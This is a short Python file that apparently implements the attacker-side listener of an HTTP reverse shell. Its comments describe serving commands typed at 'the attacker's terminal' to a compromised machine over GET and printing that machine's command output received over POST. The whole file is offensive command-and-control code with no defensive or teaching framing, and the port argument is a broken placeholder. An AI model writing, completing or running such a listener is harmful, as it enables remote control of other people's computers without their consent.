from http.server import BaseHTTPRequestHandler, HTTPServer

class ShellHandler(BaseHTTPRequestHandler):
    # Handle GET requests (fetch command from attacker)
    def do_GET(self):
        # Read a command from standard input (the attacker's terminal)
        current_command = input("[+] Enter command to execute: ")

        self.send_response(200) # Send HTTP 200 OK status
        self.end_headers()

        # Write the command to the HTTP response body
        self.wfile.write(current_command.encode())

    # Handle POST requests (receive command output)
    def do_POST(self):
        # Read the request body (should contain command output)
        length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(length)

        # Print the output to standard output (attacker's terminal)
        print(f"[+] Command output:\n{post_data.decode()}")

        self.send_response(200) # Send HTTP 200 OK status
        self.end_headers()

if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", *\port*), ShellHandler)
    server.serve_forever()
